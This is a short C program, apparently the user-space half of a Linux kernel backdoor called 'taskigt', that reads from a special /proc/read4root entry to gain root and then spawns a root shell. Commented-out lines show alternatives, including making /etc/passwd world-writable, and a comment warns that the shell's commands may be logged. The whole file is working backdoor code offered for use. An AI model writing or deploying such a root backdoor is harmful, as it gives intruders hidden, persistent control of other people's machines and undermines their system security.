/*
 * giverewt.c, part of taskigt by noupe [tm@ns2.crw.se]
 *
 * Compile with: gcc -o giverewt giverewt.c
 *
 */


#include <stdio.h>
#include <unistd.h>

int main()
{
	FILE *f;

	f = fopen("/proc/read4root", "rt");
	if(!f)
	{
		printf("Can't open /proc/read4root!\n");
		return 0;
	}

	fgetc(f); /* Ok, after this call we're rewt!$@ */
	fclose(f);

	/* Now exec a shell as root 
	   (hint: stuff gets logged in ~root/.history or something similar */

	execl("/bin/sh", "sh", NULL); 
	/* execl("/usr/bin/id", "id", NULL); */
	/* execl("/bin/chmod", "chmod", "666", "/etc/passwd", NULL); */
}
